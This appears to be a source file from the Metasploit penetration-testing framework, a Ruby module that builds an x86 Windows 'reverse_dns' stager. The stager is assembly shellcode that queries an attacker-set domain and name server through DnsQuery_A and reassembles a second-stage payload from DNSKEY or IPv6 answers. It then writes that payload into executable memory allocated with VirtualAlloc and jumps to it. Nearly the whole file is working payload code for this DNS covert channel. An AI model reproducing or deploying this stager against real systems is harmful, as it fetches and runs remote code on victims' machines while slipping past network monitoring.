# -*- coding: binary -*-

module Msf

  ###
  #
  # Complex reverse_dns payload generation for Windows ARCH_X86
  #
  ###

  module Payload::Windows::ReverseDns

    include Msf::Payload::TransportConfig
    include Msf::Payload::Windows
    include Msf::Payload::Windows::BlockApi
    include Msf::Payload::Windows::Exitfunk

    #
    # Generate the first stage
    #
    def generate(opts = {})
      ds   = opts[:datastore] || datastore
      conf = {
              ns_server:   ds['NS_IP'],
              domain:      ds['DOMAIN'],
              server_id:   ds['SERVER_ID'],
              req_type:    ds['REQ_TYPE'] || "DNSKEY",
              retry_count: ds['ReverseConnectRetries'],
              reliable:    false
      }

      # Generate the advanced stager if we have space
      if self.available_space && required_space <= self.available_space
        conf[:exitfunk] = ds['EXITFUNC']
        conf[:reliable] = true
      end

      generate_reverse_dns(conf)
    end

    def transport_config(opts = {})
      transport_config_reverse_dns(opts)
    end

    #
    # Generate and compile the stager
    #
    def generate_reverse_dns(opts = {})
      combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      #{asm_functions_dns()}

      start:
        pop ebp
      #{asm_reverse_dns(opts)}

      ^
      Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
    end

    #
    # Determine the maximum amount of space required for the features requested
    #
    def required_space
      # Start with our cached default generated size
      space = cached_size

      # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
      space += 29

      # Reliability adds some bytes!
      space += 44

      # The final estimated size
      # The final estimated size
      space
    end

    #
    # Generate an assembly stub with the configured feature set and options.
    #
    # @option opts [String]  :domain DOMAIN that wll be used for tunnel
    # @option opts [String]  :ns_server Optional: NS server, that will be used.
    # @option opts [Integer] :retry_count Number of retry attempts
    #
    def asm_reverse_dns(opts = {})

      retry_count   = [opts[:retry_count].to_i, 1000].max
      domain        = "#{opts[:server_id]}.#{opts[:domain]}"
      req_type      = opts[:req_type]
      ns_server     = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server] || "0.0.0.0").unpack("V").first
      domain_length = domain.length + 18

      alloc_stack = (domain_length) + (4 - (domain_length % 4))
      reliable    = opts[:reliable]

      dns_options  = 0x248
      request_type = 0x1c

      if req_type == "DNSKEY"
        dns_options  |= 2
        request_type = 0x30
      end

      #
      # Shellcode is not optimize to best size, TODO...
      # //TODO optimie shellcode!
      asm = %Q^

         ;-----------------------------------------------------------------------------;
         ; Author: Alexey Sintsov (alex.sintsov[at]gmail[dot]com)
         ; Version: 1.0 (06 November 2017)
         ;-----------------------------------------------------------------------------;
         ; Input: EBP must be the address of 'api_call'.

         ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         push        'pi'               ; Push the bytes 'Dnsapi',0,0 onto the stack.
         push        'Dnsa'             ; ...
         push        esp                ; Push a pointer to the "Dnsapi" string on the stack.
         push        #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call        ebp                ; LoadLibraryA( "Dnsapi" )
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

         call         get_eip
      get_eip:
         pop           eax
         jmp           start_code

      hostname:
        db "7812.000g.0000.0.#{domain}", 0x00

        ;;;;;;;;;;; INCREMENT DOMAIN
      increment:
         push        ebp
         mov         ebp, esp
         add         ebp, 8

         mov         eax, [ebp+4]      ; DOMAIN
         add         eax, [ebp]        ; offset

         ; domain inc proc
         mov         eax, [eax]
         mov         ebx, eax
         shl         eax, 16
         shr         eax, 16
         shr         ebx, 16
         inc         bh
         cmp         bh, 0x3a
         jnz         increment_done
         mov         bh, 0x30
         inc         bl
         cmp         bl, 0x3a
         jnz         increment_done
         mov         bl, 0x30
         inc         ah
         cmp         ah, 0x3a
         jnz         increment_done
         mov         ah, 0x30
         inc         al

      increment_done:
         shl         ebx, 16
         or          eax, ebx
         mov         ecx, [ebp + 4]
         add         ecx, [ebp]
         mov         [ecx], eax
         pop         ebp
         ret         8
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;

        ;;;;;;;;;;; CALL DNS
     call_dns:
         push        ebp
         mov         ebp, esp
         add         ebp, 8
         push        20
         push        -1

      dns_loop:
         mov         eax, [esp + 4]
         test        eax, eax
         je          dns_loop_end              ; out of tries 8(
         mov         eax, [esp]
         test        eax, eax
         je          dns_loop_end              ; done, got result
         push        0
         mov         eax, [ebp + 4]            ;  result
         push        eax
         mov         ecx, [ebp + 8]            ;  NS IP
         push        ecx
         push        #{dns_options}
         push        #{request_type}
         mov         edx, [ebp]               ;  domain
         push        edx
         push        #{Rex::Text.block_api_hash('Dnsapi.dll', 'DnsQuery_A')}
         call        [esp + 0x24]
         mov         [esp], eax
         mov         eax, [esp + 4]
         dec         eax
         mov         [esp + 4], eax
         jmp         dns_loop
      dns_loop_end:
         pop         eax
         pop         ebp
         pop         ebp
         ret
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

      start_code:
      ;;;;;;;;; INIT VARS in stack



         sub         esp, #{alloc_stack}
         mov         ecx, #{domain_length}
         mov         edi, esp
         mov         esi, eax
         add         esi, 6
         rep         movsb               ; copy domain to the stack
         xor         eax, eax
         push        eax                 ; pointer to RWX memory (for stage1)
         push        eax                 ; size of stage1
         push        eax                 ; offset
         push        eax                 ; * pointer to DNS_RECORD(as result)
         push        eax
         push        eax                 ; * IP4_ARRAY[1]
         push        #{retry_count}      ; * tries counter

         ;;;;;;;;; main proc

         mov         ebx, #{ns_server}     ; NS IP
         mov         eax, esp
         add         eax, 4
         test      ebx, ebx
         je         no_ns_server
         ; IP4_ARRAY
         mov         [eax], 1;
         mov         [eax + 4], ebx

      no_ns_server:
         push        eax                 ; NS IP4_ARRAY pointer
         add         eax, 0x08
         push        eax                 ; DNS_RECORD pointer
         add         eax, 0x10
         push        eax                 ; DOMAIN pointer

      get_header:
         dec         [esp + 0x0c]        ; load tries number
         mov         eax, [esp + 0x0c]   ; decrement
         test        eax, eax
         je          exit_func
         mov         eax, esp
         add         eax, 0x28
         push        eax
         push        10
         call        increment
         call        call_dns
         test        eax, eax
         jne         parse_end_br
         mov         eax, [esp + 0x18]
         push        eax
         mov         esi, esp              ; pointer to DNS_RECORD
         mov         [esi], eax            ; ESI < -pointer to DNS_RECORD
      next_iph:
         mov         edx, [esi]
         test        edx, edx
         je          parse_end_b
         mov         ebx, [edx]            ; EBX <-NEXT pointer
         mov         [esi], ebx            ; save Next IP
         movzx       eax, word ptr [edx + 8]
         cmp         eax, #{request_type}
         jne         next_iph
    ^

      if req_type == "IPv6" # IPv6

        asm << %Q^

         add         edx, 0x18                ; EDX < -IP pointer
         movzx       ecx, byte ptr[edx + 1]   ; header byte 1
         cmp         cl, 0x81                 ; If this is header flag
         jne         parse_end_b
         movzx       ecx, byte ptr[edx]
         cmp         cl, 0xfe                 ; check if fe have data flag in this header
         jne         parse_end_b

      get_size:
         movzx       eax, byte ptr[edx + 0x0a]
         test        eax, eax
         je          parse_end_b
         cmp         eax, 1
         jne         parse_end_b
         pop         eax
         mov         eax, [edx + 0xb]            ; SIZE of stage 1
         mov         [esp + 0x20], eax
         jmp         parse_end

      ^
      else
        # DNSKKEY
        asm << %Q^

         add        edx,0x20
         movzx      ecx,byte ptr ds:[edx]          ; check status
         test       ecx,ecx                        ; If this is header flag
         jne        parse_end_b

       get_size:
         pop        eax
         mov        eax,  dword ptr ds:[edx + 0x7]     ; get size
         mov        [esp + 0x20], eax
         jmp        parse_end
      ^
      end

      ###################
      asm << %Q^

      parse_end_br:
         xor         eax, eax
         jmp         parse_end
      parse_end_b:
         pop         eax
         xor         eax, eax
      parse_end:
         test       eax, eax
         je         get_header

         mov         eax, esp
         mov         byte ptr[eax + 0x30], '0'          ; switch to data mode

         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    RESET COUNTER
         mov         dword ptr[esp + 0x0c], 50
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    GET MEM
         mov         eax, [esp + 0x20]           ; get size, that  we just recieved
         push        0x40                        ; PAGE_EXECUTE_READWRITE
         push        0x1000                      ; MEM_COMMIT
         push        eax                         ; push the newly recieved second stage length.
         push        0                           ; NULL as we dont care where the allocation is.
         push        #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call        ebp
         mov         [esp + 0x24], eax           ; save pointer to RWX mem
         jmp         get_data
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  GETTING DATA LOOP

      get_data_next_try:
         dec         [esp + 0x0c]                ; retry_counter decrement
         mov         eax, [esp + 0x0c]
         test        eax, eax                    ; if retry_counter is 0, we done... sorry ggwp
         je          exit_func

      get_data:
         call        call_dns
         test        eax, eax
         jne         parse_end_db2
         mov         eax, [esp + 0x18]
         push        eax                  ; ESI <-pointer to DNS_RECORD
         mov         eax, [esp + 0x20]
         push        eax                 ; save current offset


      ip_enum:
         mov         eax, [esp+4]
         test        eax, eax
         je          copy_end
         mov         ebx, [eax]          ; EBX <-NEXT pointer
         mov         [esp + 4], ebx      ; save Next IP

         movzx       edx, word ptr [eax + 8]
         cmp         edx, #{request_type}
         jne         ip_enum

    ^

      if req_type == "IPv6" #IPv6
        asm << %Q^
         mov         edx, eax
         add         edx, 0x18           ; EDX <-IP pointer
         xor         eax, eax

         movzx       ecx, byte ptr[edx + 1]      ; header byte 1, size for IP
         mov         al, cl
         and         cl, 0x0f                    ; apply MASK to get size of data in that IP
         cmp         cl, 0x0e                    ; amount of bytes in that IP, should be 14 or less
         ja          parse_end_db


         movzx       ebx, byte ptr[edx]
         cmp         bl, 0xfe                    ; if FE, than index offset is 16
         je          index_16
         cmp         bl, 0xff                    ; if FF, than index offset in AL reg
         je          index_al
         jmp         parse_end_db                ; else - something wrong!

      index_16:
         mov         al, 16
         imul        eax, 0x0e
         jmp         copy_ip_as_data

      index_al:
         shr         al, 4
         imul        eax, 0x0e

      copy_ip_as_data:
         mov         esi, edx                ; src - IP addr
         add         esi, 2
         mov         ebx, [esp]
         mov         edi, [esp + 0x2c]
         add         edi, ebx                ; dst - RWX mem
         add         edi, eax
         add         [esp+0x24], ecx
         mov         eax, ecx
         cld
         rep         movsb                  ; copy
         sub         [esp + 0x28], eax
         jmp         ip_enum
      ^
      else
        # DNSKKEY
        asm << %Q^
        mov         ecx, dword ptr ds:[eax + 0x1c]  ; ECX <- current size
        test        ecx, ecx
        je          parse_end_db
        sub         ecx, 3
        add         [esp + 0x24], ecx
        sub         [esp + 0x28], ecx
        mov         esi, eax
        add         esi, 0x23                    ; ESI <-  source
        mov         ebx, [esp]
        mov         edi, [esp + 0x2c]
        add         edi, ebx                     ; dst - RWX mem
        cld
        rep         movsb                        ; copy

      ^
      end

      #########################
      asm << %Q^
      copy_end:
         add         esp, 0x8
         mov         eax, [esp + 0x20]
         test        eax, eax
         je          got_everything

         mov         eax, esp
         add         eax, 0x28
         push        eax
         push        5
         call        increment
         jmp         get_data

      parse_end_db:
         add         esp, 0x8
      parse_end_db2:
         mov         eax, esp
         add         eax, 0x28
         push        eax
         push        10
         call        increment
         jmp         get_data_next_try

      got_everything:
      ;;;;;;;;;;;;;;;;;;;;;;;;;
         mov             eax, [esp + 0x24]
         add             eax, 4
         jmp             eax
      ;;;;;;;;;;;;;;;;;;;;;;;;;

    ^

      if reliable
        if opts[:exitfunk]
          asm << %Q^
          exit_func:
        ^
          asm << asm_exitfunk(opts)
        else
          asm << %Q^
          exit_func:
            push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
            call ebp
        ^
        end
      else
        asm << %Q^
          exit_func:

      ^
      end

      asm
    end

    def asm_functions_dns()

      asm = %Q^

      ^
      asm
    end

    #
    # Do not transmit the stage over the connection.  We handle this via DNS
    #
    def stage_over_connection?
      false
    end

  end

end
